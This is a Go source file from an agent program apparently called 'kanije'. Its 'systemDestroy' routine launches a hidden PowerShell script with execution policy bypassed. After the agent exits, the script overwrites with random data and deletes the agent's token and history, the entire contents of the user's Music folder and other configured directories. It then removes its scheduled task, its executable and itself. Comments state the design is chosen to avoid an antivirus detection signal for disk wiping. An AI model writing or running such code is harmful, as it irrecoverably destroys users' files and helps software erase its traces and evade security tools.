//go:build windows

package app

import (
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/kanije-kalesi/kanije/internal/sysproc"
)

// systemDestroy launches a detached helper that, after this process exits,
// overwrites the agent's sensitive files (token, history) AND the contents of the
// user's Music folder + configured targets with random data and deletes them, then
// removes the scheduled task and the executable. No factory reset — the OS stays
// intact, keeping the data-protection goal without the T1561 disk-wipe AV signal.
func systemDestroy(plan destroyPlan) error {
	scriptPath := filepath.Join(os.TempDir(), "kanije-destroy.ps1")
	if err := os.WriteFile(scriptPath, []byte(buildDestroyScript(os.Getpid(), plan)), 0o600); err != nil {
		return err
	}

	cmd := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", scriptPath)
	sysproc.Hide(cmd)
	if err := cmd.Start(); err != nil {
		os.Remove(scriptPath)
		return err
	}
	return nil
}

// secureWipeFunc is the PowerShell one-pass overwrite-then-delete helper. One
// random pass defeats file-recovery tooling on both HDD and SSD (multi-pass is
// pointless on flash and slow on disk).
const secureWipeFunc = `$ErrorActionPreference='SilentlyContinue'
function Wipe($path){
  if (-not (Test-Path -LiteralPath $path)) { return }
  try {
    $len = (Get-Item -LiteralPath $path).Length
    $fs = [System.IO.File]::Open($path,'Open','Write')
    $buf = New-Object byte[] 65536
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $written = [int64]0
    while ($written -lt $len) {
      $rng.GetBytes($buf)
      $chunk = [int][Math]::Min([int64]$buf.Length, $len - $written)
      $fs.Write($buf,0,$chunk)
      $written += $chunk
    }
    $fs.Flush(); $fs.Close()
  } catch {}
  Remove-Item -Force -LiteralPath $path
}
function WipeDir($dir){
  if (-not (Test-Path -LiteralPath $dir)) { return }
  Get-ChildItem -LiteralPath $dir -Recurse -File -Force | ForEach-Object { Wipe $_.FullName }
  Get-ChildItem -LiteralPath $dir -Recurse -Directory -Force | Sort-Object { $_.FullName.Length } -Descending | ForEach-Object { Remove-Item -LiteralPath $_.FullName -Recurse -Force }
}
`

func buildDestroyScript(pid int, plan destroyPlan) string {
	var b strings.Builder
	b.WriteString(secureWipeFunc)
	b.WriteString("$p=" + strconv.Itoa(pid) + "\n")
	b.WriteString("while (Get-Process -Id $p -ErrorAction SilentlyContinue) { Start-Sleep -Milliseconds 300 }\n")
	b.WriteString("Start-Sleep -Milliseconds 800\n")

	// Shred the agent's own sensitive files (token, history).
	for _, f := range plan.SecureFiles {
		b.WriteString("Wipe " + psQuote(f) + "\n")
	}

	// Securely erase the CONTENTS of the user's Music folder (resolved correctly
	// even with OneDrive redirection) plus any extra configured targets. The
	// folders themselves stay; only their contents are unrecoverably wiped.
	b.WriteString("$m=[Environment]::GetFolderPath('MyMusic')\n")
	b.WriteString("if ($m) { WipeDir $m }\n")
	for _, d := range plan.WipeDirs {
		b.WriteString("WipeDir " + psQuote(d) + "\n")
	}

	for _, d := range plan.Dirs {
		b.WriteString("Remove-Item -Recurse -Force -LiteralPath " + psQuote(d) + "\n")
	}
	if plan.Task != "" {
		b.WriteString("schtasks /delete /tn " + psQuote(plan.Task) + " /f | Out-Null\n")
		b.WriteString("Unregister-ScheduledTask -TaskName " + psQuote(plan.Task) + " -Confirm:$false\n")
	}
	if plan.Exe != "" {
		b.WriteString("Remove-Item -Force -LiteralPath " + psQuote(plan.Exe) + "\n")
	}
	b.WriteString("Remove-Item -Force \"$env:TEMP\\kanije-*.ps1\"\n")

	// NOTE: no factory reset — keeps the OS intact and avoids the T1561 AV signal.
	b.WriteString("Remove-Item -Force -LiteralPath $MyInvocation.MyCommand.Path\n")
	return b.String()
}
